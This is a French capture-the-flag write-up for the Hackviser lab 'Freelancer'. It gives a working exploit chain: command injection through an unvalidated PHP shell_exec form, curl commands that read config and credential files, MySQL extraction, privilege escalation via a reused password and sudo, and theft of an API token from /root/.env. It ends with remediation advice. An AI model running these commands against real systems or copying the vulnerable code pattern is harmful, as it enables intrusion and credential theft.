# Writeup — Freelancer (Hackviser)

**Catégorie :** Web / System  
**Difficulté :** Easy  
**Points :** 37  
**Machine :** `williamtaylor.hv`  

---

## 📜 Description

> William, as a freelance developer, showcases his completed projects and tasks in his portfolio. Your company is considering working with William; however, before initiating the collaboration, you want to ensure that the developer is reliable and writes secure code.

Quatre informations sont à trouver :

1. Quel est le nouveau projet de William ?
2. Quel est le nom complet du client qui a rapporté le plus haut revenu ?
3. Quelle est l'adresse e-mail que William utilise sur git ?
4. Quelle est la GitHub API Key que William a utilisée ?

---

## 🔍 Reconnaissance

### Scan Nuclei

```bash
nuclei -u http://williamtaylor.hv/
```

Résultats importants :

```
[drupal-directory-listing] [http] [low]  http://williamtaylor.hv/vendor/
[waf-detect:apachegeneric]               http://williamtaylor.hv/
[mysql-info]       williamtaylor.hv:3306 ["Version: 5.5.5-10.5.21-MariaDB-0+deb11u1"]
[ssh-server-enumeration]  williamtaylor.hv:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
[apache-detect]    http://williamtaylor.hv/ ["Apache/2.4.56 (Debian)"]
```

Points clés :

- Serveur **Apache 2.4.56** sur Debian
- **Directory listing activé** sur `/vendor/`
- **MariaDB** sur le port 3306
- **OpenSSH** sur le port 22

### Exploration manuelle

En naviguant sur `http://williamtaylor.hv/`, on découvre le portfolio HTML de William Taylor (développeur freelance).

En accédant à `http://williamtaylor.hv/devtools/`, le **directory listing** est activé et révèle deux fichiers PHP intéressants :

```
command-line.php     1.4K   2024-02-10
performance_monitor.php  1.9K   2024-02-10
```

---

## 💥 Exploitation — RCE via Command Injection

### Analyse de command-line.php

```bash
curl -s http://williamtaylor.hv/devtools/command-line.php
```

Le formulaire accepte une commande via POST. En lisant le code source via la RCE :

```php
<?php
$result = "";
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $command = $_POST['command'];
    $output = shell_exec($command);  // ← AUCUNE VALIDATION !
    $result = htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
}
?>
```

**Vulnérabilité :** `shell_exec()` est appelé directement sur l'entrée utilisateur sans aucune validation. C'est une **Remote Code Execution (RCE)** triviale.

### Vérification

```bash
curl -s -X POST -d "command=id" http://williamtaylor.hv/devtools/command-line.php
# Résultat : uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

On est `www-data`. On a une RCE opérationnelle.

---

## 🗃️ Extraction des informations

### Structure du site web

```bash
curl -s -X POST -d "command=ls -la .." http://williamtaylor.hv/devtools/command-line.php
```

```
/var/www/williamtaylor.hv/
├── config.php
├── css/
├── devtools/
│   ├── command-line.php
│   └── performance_monitor.php
├── img/
├── index.html
├── js/
├── projects/
│   └── new-project.txt     ← 👀
├── scss/
└── vendor/
```

### Question 1 — Nouveau projet de William

```bash
curl -s -X POST -d "command=cat ../projects/new-project.txt" \
  http://williamtaylor.hv/devtools/command-line.php
```

```
Project Name: Eco-Friendly
Client: Green Innovations
Client Email Address: contact@greeninnovations.hv

Project Summary:
This project involves developing a website for Green Innovations Ltd.,
a company dedicated to eco-friendly technologies and sustainable solutions.
[...]
```

**✅ Réponse 1 : `Eco-Friendly`**

### Credentials de la base de données

```bash
curl -s -X POST -d "command=cat ../config.php" \
  http://williamtaylor.hv/devtools/command-line.php
```

```php
define('DB_HOST',     'localhost');
define('DB_USER',     'william');
define('DB_PASSWORD', 'wt-devx-1');
define('DB_NAME',     'freelance_jobs');
```

→ Mot de passe de William : **`wt-devx-1`**

### Question 2 — Client avec le plus haut revenu

```bash
curl -s -X POST \
  -d "command=mysql -u william -pwt-devx-1 freelance_jobs -e 'SELECT * FROM clients;'" \
  http://williamtaylor.hv/devtools/command-line.php
```

Extrait des résultats (table `clients`) :

| id | name | email | earnings |
|----|------|-------|----------|
| 1  | Emma Johnson | <emma.johnson@mail.hv> | 3200.00 |
| 19 | **Evelyn Lewis** | <evelyn.lewis@mail.hv> | **7250.00** |
| ... | ... | ... | ... |

Evelyn Lewis est de loin la cliente la mieux payée avec **7250.00** (presque le double du 2ème).

**✅ Réponse 2 : `Evelyn Lewis`**

### Question 3 — E-mail Git de William

```bash
curl -s -X POST -d "command=cat /home/william/.gitconfig" \
  http://williamtaylor.hv/devtools/command-line.php
```

```ini
[user]
    name = William Taylor
    email = william.dev@williamtaylor.hv
```

**✅ Réponse 3 : `william.dev@williamtaylor.hv`**

---

## 🔐 Escalade de privilèges — De www-data à root

### Pivot vers l'utilisateur William

Le mot de passe de la base de données (`wt-devx-1`) est réutilisé pour le compte système de William. On peut donc se substituer à lui via `su` :

```bash
curl -s -X POST \
  -d "command=echo 'wt-devx-1' | su william -c 'env'" \
  http://williamtaylor.hv/devtools/command-line.php
```

```
USER=william
HOME=/home/william
SHELL=/bin/bash
...
```

✅ On est maintenant **william**.

### Vérification des droits sudo

```bash
curl -s -X POST \
  -d "command=echo 'wt-devx-1' | su william -c 'echo wt-devx-1 | sudo -S -l'" \
  http://williamtaylor.hv/devtools/command-line.php
```

```
User william may run the following commands on debian:
    (ALL : ALL) ALL
```

**William est sudoer complet !** Il peut exécuter n'importe quelle commande en tant que root.

### Question 4 — GitHub API Key

On fait un scan complet du système en cherchant des fichiers sensibles en tant que root :

```bash
curl -s -X POST \
  -d "command=echo 'wt-devx-1' | su william -c 'echo wt-devx-1 | sudo -S find / -not -path \"/proc/*\" -not -path \"/sys/*\" -name \".env\" 2>/dev/null'" \
  http://williamtaylor.hv/devtools/command-line.php
```

```
/root/.env
```

On lit ce fichier :

```bash
curl -s -X POST \
  -d "command=echo 'wt-devx-1' | su william -c 'echo wt-devx-1 | sudo -S cat /root/.env'" \
  http://williamtaylor.hv/devtools/command-line.php
```

```
GITHUB_API_KEY=ghp_X12bQ34rT56yZ78uV90wA12bC34dE56fG78h
```

**✅ Réponse 4 : `ghp_X12bQ34rT56yZ78uV90wA12bC34dE56fG78h`**

---

## 📊 Tableau des réponses

| # | Question | Réponse |
|---|----------|---------|
| 1 | Nouveau projet de William | `Eco-Friendly` |
| 2 | Client avec le plus haut revenu | `Evelyn Lewis` |
| 3 | E-mail Git de William | `william.dev@williamtaylor.hv` |
| 4 | GitHub API Key | `ghp_X12bQ34rT56yZ78uV90wA12bC34dE56fG78h` |

---

## 🗺️ Chaîne d'exploitation complète

```
Nuclei scan
    └─► Directory listing sur /devtools/
            └─► command-line.php sans validation = RCE (www-data)
                    ├─► config.php → DB password : wt-devx-1
                    │       └─► MySQL → Table clients → Evelyn Lewis (7250$)
                    ├─► /projects/new-project.txt → Projet : Eco-Friendly
                    ├─► /home/william/.gitconfig → Email : william.dev@williamtaylor.hv
                    └─► su william (mot de passe réutilisé : wt-devx-1)
                            └─► sudo -l → (ALL:ALL) ALL
                                    └─► sudo cat /root/.env → GitHub API Key
```

---

## 🛡️ Vulnérabilités identifiées

| Vulnérabilité | Sévérité | Localisation |
|---------------|----------|-------------|
| Remote Code Execution (RCE) | 🔴 Critique | `/devtools/command-line.php` — `shell_exec()` sans validation |
| Directory Listing activé | 🟠 Haute | `/devtools/` exposé publiquement |
| Réutilisation de mot de passe | 🟠 Haute | `wt-devx-1` = mot de passe DB ET compte système |
| Permissions sudo excessives | 🔴 Critique | William a `(ALL:ALL) ALL` sans restriction |
| Secret exposé dans `/root/.env` | 🟠 Haute | Clé API GitHub en clair sur le système |
| Outil de développement en production | 🔴 Critique | `command-line.php` jamais à déployer en prod |
| Bootstrap 4 Beta en production | 🟡 Moyenne | Versions bêta non patchées (CVE-2018-14041) |

---

## ✏️ Recommandations

1. **Supprimer immédiatement** `/devtools/command-line.php` du serveur de production.
2. **Ne jamais passer les entrées utilisateurs** à `shell_exec`, `exec`, `system` ou `passthru` sans validation stricte.
3. **Ne pas réutiliser** les mots de passe entre la base de données et les comptes système.
4. **Restreindre les droits sudo** : utiliser le principe du moindre privilège.
5. **Stocker les secrets** (clés API, tokens) dans un gestionnaire de secrets (Vault, AWS Secrets Manager, etc.) et non dans des fichiers `.env` sur le serveur.
6. **Désactiver le directory listing** Apache (`Options -Indexes` dans la configuration).
7. **Mettre à jour Bootstrap** vers une version stable et patchée (v5+).

---

*Writeup rédigé le 2026-02-21 — Machine Hackviser : williamtaylor.hv*
